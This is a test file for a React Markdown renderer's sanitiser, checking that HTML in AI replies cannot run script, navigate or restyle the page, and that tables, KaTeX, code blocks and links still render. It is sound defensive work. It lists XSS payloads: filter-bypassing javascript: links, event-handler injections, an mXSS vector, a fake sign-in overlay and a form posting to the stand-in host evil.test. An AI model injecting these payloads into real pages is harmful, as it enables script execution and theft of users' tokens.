/**
 * HTML inside Markdown is parsed (rehype-raw) and then held to an allow-list. The app shell has
 * no CSP and keeps the auth token in `localStorage`, so an AI reply that echoes an outside
 * reviewer's `<iframe srcdoc>` must not reach the page as one. Each payload below has to come
 * out inert, and everything ordinary replies rely on has to come out unchanged.
 */
import { afterAll, describe, expect, it } from "bun:test";
import { installDom, uninstallDom, mount } from "../../helpers/react-dom";

installDom();
const { act } = await import("react");
const { MarkdownRenderer } = await import("../../../src/web/components/shared/markdown-renderer");
afterAll(uninstallDom);

const PWN = "window.__pwned=1";

const PAYLOADS: Array<[string, string]> = [
  ["iframe srcdoc", `<iframe srcdoc="<script>${PWN}</script>"></iframe>`],
  ["script", `<script>${PWN}</script>`],
  ["img onerror", `<img src="x" onerror="${PWN}">`],
  ["javascript: link", `<a href="javascript:${PWN}">a</a>`],
  ["mixed-case javascript: link", `<a href="JaVaScRiPt:${PWN}">a</a>`],
  ["entity-encoded javascript: link", `<a href="&#106;avascript:${PWN}">a</a>`],
  ["tab-split javascript: link", `<a href="java\tscript:${PWN}">a</a>`],
  ["vbscript: link", `<a href="vbscript:msgbox(1)">a</a>`],
  ["data:text/html link", `<a href="data:text/html,<script>${PWN}</script>">a</a>`],
  ["markdown javascript: link", `[a](javascript:${PWN})`],
  ["svg onload", `<svg onload="${PWN}"><circle r="5"/></svg>`],
  ["form", `<form action="https://evil.test/steal"><input name="q" type="text"><button>Go</button></form>`],
  ["object", `<object data="data:text/html,<script>${PWN}</script>"></object>`],
  ["embed", `<embed src="data:text/html,<script>${PWN}</script>">`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.test">`],
  ["base", `<base href="https://evil.test/">`],
  ["style", `<style>body{display:none}</style>`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.test/x.css">`],
  ["page overlay", `<div class="fixed inset-0 z-50" style="position:fixed;inset:0">Sign in again</div>`],
  ["details ontoggle", `<details open ontoggle="${PWN}"><summary>s</summary>x</details>`],
  ["input onfocus", `<input type="text" autofocus onfocus="${PWN}">`],
  ["video source onerror", `<video><source onerror="${PWN}"></video>`],
  ["math mXSS", `<math><mtext><table><mglyph><style><img src=x onerror="${PWN}">`],
  ["template", `<template><img src=x onerror="${PWN}"></template>`],
  ["katex href", `$$\\href{javascript:${PWN}}{x}$$`],
];

const FORBIDDEN_TAGS = "iframe,frame,script,object,embed,form,meta,base,style,link,svg,video,audio,source,template,button,textarea,select";
const BAD_URL = /^\s*(javascript|vbscript|data):/i;

async function settle(times = 10) {
  for (let i = 0; i < times; i++) await act(async () => { await new Promise((r) => setTimeout(r, 5)); });
}

async function render(content: string) {
  const view = await mount(<MarkdownRenderer content={content} />);
  await settle();
  return view;
}

function expectInert(root: Element) {
  expect(root.querySelectorAll(FORBIDDEN_TAGS).length).toBe(0);
  // React 19 hoists `<meta>`, `<link>` and `<title>` out of the tree into `<head>`.
  expect(document.querySelectorAll("meta[http-equiv], base, link[href*='evil.test']").length).toBe(0);
  for (const el of root.querySelectorAll("*")) {
    for (const attr of el.getAttributeNames()) {
      expect(attr.startsWith("on")).toBe(false);
      expect(["srcdoc", "formaction", "http-equiv"]).not.toContain(attr);
    }
    for (const url of ["href", "src", "action", "data"]) {
      const value = el.getAttribute(url);
      if (value) expect(BAD_URL.test(value.replace(/[\t\n\r]/g, ""))).toBe(false);
    }
  }
  expect(root.querySelectorAll("[class*='fixed'], div[style]").length).toBe(0);
  expect(root.querySelectorAll("input:not([disabled])").length).toBe(0);
  expect((globalThis as { __pwned?: number }).__pwned).toBeUndefined();
}

describe("raw HTML that could run script, navigate or restyle the page renders inert", () => {
  it.each(PAYLOADS)("%s", async (_name, payload) => {
    const view = await render(`Reviewer said: ${payload}`);
    expectInert(view.container);
    expect(view.container.textContent).toContain("Reviewer said:");
    await view.unmount();
  });

  it("keeps the text of an element it drops, but not a stylesheet's", async () => {
    const view = await render(`<form><p>inside a form</p></form><style>.x{color:red}</style>`);
    expect(view.container.textContent).toContain("inside a form");
    expect(view.container.textContent).not.toContain("color:red");
    await view.unmount();
  });
});

describe("what replies rely on still renders", () => {
  it("tables, task lists, details, kbd, sub, sup and br", async () => {
    const view = await render([
      "| a | b |\n|:--|--:|\n| 1 | 2 |",
      "- [ ] todo\n- [x] done",
      "<details><summary>More</summary>\n\nHidden **md**\n\n</details>",
      "Press <kbd>Ctrl</kbd>, H<sub>2</sub>O, x<sup>2</sup>, one<br>two",
    ].join("\n\n"));
    const c = view.container;
    expect(c.querySelector("table td")?.textContent).toBe("1");
    const boxes = [...c.querySelectorAll("input[type='checkbox']")];
    expect(boxes.length).toBe(2);
    expect(boxes.every((b) => b.hasAttribute("disabled"))).toBe(true);
    expect(boxes[1]!.hasAttribute("checked")).toBe(true);
    expect(c.querySelector("details summary")?.textContent).toBe("More");
    expect(c.querySelector("details strong")?.textContent).toBe("md");
    expect(c.querySelector("kbd")?.textContent).toBe("Ctrl");
    expect(c.querySelector("sub")?.textContent).toBe("2");
    expect(c.querySelector("sup")?.textContent).toBe("2");
    expect(c.querySelector("br")).not.toBeNull();
    await view.unmount();
  });

  it("KaTeX, inline and display, including its MathML", async () => {
    const view = await render("Inline $$a^2$$ here\n\n$$\n\\frac{a}{b}\n$$\n\n<code class=\"language-math math-display\">x+y</code>");
    const c = view.container;
    expect(c.querySelectorAll(".katex").length).toBe(3);
    expect(c.querySelectorAll(".katex-display").length).toBe(2);
    expect(c.querySelector(".katex math annotation")?.textContent).toBe("a^2");
    expect(c.querySelector(".katex-html span[style]")).not.toBeNull();
    await view.unmount();
  });

  it("a highlighted code block", async () => {
    const view = await mount(<MarkdownRenderer content={"```ts\nconst answer: number = 42;\n```"} />);
    for (let i = 0; i < 400 && !view.container.querySelector(".shiki-block"); i++) await settle(1);
    const block = view.container.querySelector(".shiki-block");
    expect(block).not.toBeNull();
    expect(block!.querySelectorAll("span[style]").length).toBeGreaterThan(1);
    expect(block!.textContent).toContain("const answer: number = 42;");
    await view.unmount();
  });

  it("images and links, external ones opening safely in a new tab", async () => {
    const view = await render([
      "![logo](https://example.com/a.png) <img src=\"https://example.com/b.png\" alt=\"b\" width=\"20\">",
      "[site](https://example.com) <a href=\"https://example.org\" target=\"_blank\">raw</a> <a href=\"mailto:a@b.test\">mail</a>",
    ].join("\n\n"));
    const c = view.container;
    expect([...c.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual(["https://example.com/a.png", "https://example.com/b.png"]);
    expect(c.querySelector("img[alt='b']")?.getAttribute("width")).toBe("20");
    for (const a of c.querySelectorAll("a[href^='https:']")) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toBe("noopener noreferrer");
    }
    expect(c.querySelector("a[href='mailto:a@b.test']")).not.toBeNull();
    await view.unmount();
  });

  it("local file links and Windows image paths, which a scheme allow-list would delete", async () => {
    const view = await render("[g](README.md:5) [w](C:\\Users\\x\\a.ts) <a href=\"src/a.ts:10\">raw</a>\n\n<img src=\"C:/tmp/b.png\" alt=\"b\">");
    const hrefs = [...view.container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual(["README.md:5", "C:%5CUsers%5Cx%5Ca.ts", "src/a.ts:10"]);
    expect(view.container.querySelector("img")?.getAttribute("src")).toBe("C:/tmp/b.png");
    await view.unmount();
  });

  it("footnotes and in-page anchors still point at the ids the sanitiser prefixed", async () => {
    const view = await render("Text[^1] and <a href=\"#sec\">jump</a>.\n\n<h2 id=\"sec\">Sec</h2>\n\n[^1]: The note.");
    const c = view.container;
    const links = [...c.querySelectorAll("a[href^='#']")];
    expect(links.length).toBe(3);
    for (const a of links) {
      const id = decodeURIComponent(a.getAttribute("href")!.slice(1));
      expect(id.startsWith("user-content-")).toBe(true);
      expect(c.querySelector(`[id="${id}"]`)).not.toBeNull();
    }
    await view.unmount();
  });

  it("with rawHtml off, HTML is still shown as text", async () => {
    const view = await mount(<MarkdownRenderer content={"<kbd>Ctrl</kbd> and **bold**"} rawHtml={false} />);
    expect(view.container.querySelector("kbd")).toBeNull();
    expect(view.container.textContent).toContain("<kbd>Ctrl</kbd>");
    expect(view.container.querySelector("strong")?.textContent).toBe("bold");
    await view.unmount();
  });
});
